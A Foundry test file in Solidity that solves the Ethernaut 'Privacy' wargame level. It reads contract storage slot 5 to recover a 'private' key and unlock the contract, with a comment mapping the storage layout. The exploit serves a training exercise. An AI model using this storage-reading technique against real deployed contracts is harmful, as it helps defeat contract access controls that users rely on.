// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/12-Privacy/PrivacyFactory.sol";
import "../../../src/core/Ethernaut.sol";

contract PrivacyTest is Test {
    Ethernaut ethernaut;
    address attacker = address(0xabcd);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testPrivacyHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        PrivacyFactory privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(privacyFactory);
        Privacy ethernautPrivacy = Privacy(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        /**
            bool(1 bytes) locked takes up one slot          -> slot 0

            uint256(32 bytes) constantID takes up one slot  -> slot 1

            uint8(1 bytes) flattening, 
            uin8(1 bytes) denomination and 
            uint16(2 bytes) awkwardness                     -> slot 2

            bytes32[3] data                                 -> slot 3, 4 and 5

            Therefore data[2] is stored in slot 5
         */

        bytes32 slot5 = vm.load(address(ethernautPrivacy), bytes32(uint256(5)));
        ethernautPrivacy.unlock(bytes16(slot5));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
